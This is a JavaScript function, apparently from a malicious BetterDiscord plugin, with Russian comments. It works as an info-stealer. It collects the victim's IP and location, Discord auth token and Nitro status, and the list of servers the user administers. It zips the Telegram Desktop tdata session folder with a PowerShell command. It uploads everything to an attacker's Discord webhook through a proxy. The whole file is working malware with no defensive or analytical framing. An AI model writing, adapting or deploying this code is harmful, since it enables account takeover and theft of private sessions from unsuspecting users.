async function executeFullTest(BdApi, webhookUrl, proxyUrl, fs, path, execSync) {
    // Проверяем, что модули дошли
    if (!fs || !path || !execSync) {
        return { success: false, error: "Модули Node.js не были переданы из плагина." };
    }

    let result = {
        ip: null,
        location: null,
        nitro: "Нет",
        dtoken: null,
        telegram_path: null,
        admin_servers: []
    };
    
    // 1. IP и Локация
    try {
        const ipRes = await BdApi.Net.fetch('https://jsonip.com/');
        const ipData = await ipRes.json();
        result.ip = ipData.ip;
        
        const geoRes = await BdApi.Net.fetch(`http://ip-api.com/json/${result.ip}?lang=ru&fields=status,country,regionName,city`);
        const geoData = await geoRes.json();
        if (geoData.status === 'success') {
            result.location = geoData.city || geoData.regionName || geoData.country || "Неизвестно";
        }
    } catch (e) {}

    // 2. Nitro и Токен
    try {
        const UserStore = BdApi.Webpack.getStore("UserStore");
        if (UserStore) {
            const user = UserStore.getCurrentUser();
            if (user.premiumType > 0) result.nitro = "Nitro";
        }
        
        const authStore = BdApi.Webpack.getStore("AuthenticationStore");
        if (authStore && typeof authStore.getToken === 'function') result.dtoken = authStore.getToken();
    } catch (e) {}

    // 3. Поиск и архивация Telegram tdata
    let hasTdata = false;
    let tdataZipPath = "";
    try {
        const appData = process.env.APPDATA;
        if (appData) {
            const possiblePaths = [
                path.join(appData, 'Telegram Desktop', 'tdata'),
                path.join(appData, 'Telegram', 'tdata')
            ];
            
            for (const p of possiblePaths) {
                if (fs.existsSync(p)) {
                    result.telegram_path = p;
                    hasTdata = true;
                    
                    // Используем TEMP вместо os.tmpdir()
                    const tempDir = process.env.TEMP || 'C:\\Windows\\Temp';
                    tdataZipPath = path.join(tempDir, 'opium_tdata.zip');
                    
                    try {
                        if (fs.existsSync(tdataZipPath)) fs.unlinkSync(tdataZipPath);
                        execSync(`powershell -command "Compress-Archive -Path '${p}' -DestinationPath '${tdataZipPath}' -Force"`, { timeout: 30000 });
                    } catch (zipError) {
                        hasTdata = false; 
                    }
                    break;
                }
            }
        }
    } catch (e) {}

    // 4. Серверы и участники
    try {
        const GuildStore = BdApi.Webpack.getStore("GuildStore");
        const PermissionStore = BdApi.Webpack.getStore("PermissionStore");
        const GuildMemberCountStore = BdApi.Webpack.getStore("GuildMemberCountStore");
        
        if (GuildStore && PermissionStore) {
            const guilds = GuildStore.getGuilds();
            for (const g of Object.values(guilds)) {
                if (PermissionStore.can(8n, g)) {
                    let count = 0;
                    if (GuildMemberCountStore && typeof GuildMemberCountStore.getMemberCount === 'function') {
                        count = GuildMemberCountStore.getMemberCount(g.id);
                    }
                    if (!count) count = g.memberCount || g.approximateMemberCount;
                    if (!count && result.dtoken) {
                        try {
                            const res = await BdApi.Net.fetch(`https://discord.com/api/v9/guilds/${g.id}?with_counts=true`, {
                                headers: { "Authorization": result.dtoken }
                            });
                            if (res.ok) {
                                const data = await res.json();
                                count = data.approximate_member_count || data.member_count || 0;
                            }
                        } catch (err) {}
                    }
                    result.admin_servers.push({ name: g.name, members: count || 0 });
                }
            }
        }
    } catch (e) {}

    // 5. Формируем сообщение и файлы
    const nitroIcon = result.nitro !== "Нет" ? "✅" : "❌";
    const tokenIcon = result.dtoken ? "✅" : "❌";
    const tdataIcon = hasTdata ? "✅" : "❌";
    
    const messageText = `Ip: ${result.ip}\nLocation: ${result.location}\nNitro: ${nitroIcon}\nToken: ${tokenIcon}\nTdata: ${tdataIcon}\n@everyone`;

    const formData = new FormData();
    formData.append('payload_json', JSON.stringify({ content: messageText }));

    const jsonBuffer = Buffer.from(JSON.stringify(result, null, 2));
    formData.append('files[0]', new Blob([jsonBuffer], { type: 'application/json' }), 'data.json');

    if (hasTdata && fs.existsSync(tdataZipPath)) {
        const zipBuffer = fs.readFileSync(tdataZipPath);
        formData.append('files[1]', new Blob([zipBuffer], { type: 'application/zip' }), 'tdata.zip');
    }

    // 6. Отправка
    try {
        const proxyUrlFull = `${proxyUrl}/?url=${encodeURIComponent(webhookUrl)}`;
        const response = await BdApi.Net.fetch(proxyUrlFull, {
            method: 'POST',
            body: formData
        });
        
        if (!response.ok) {
            const errorText = await response.text();
            return { success: false, error: `Discord вернул ${response.status}: ${errorText}` };
        }
        return { success: true };
    } catch (e) {
        return { success: false, error: `Ошибка сети: ${e.message}` };
    }
}
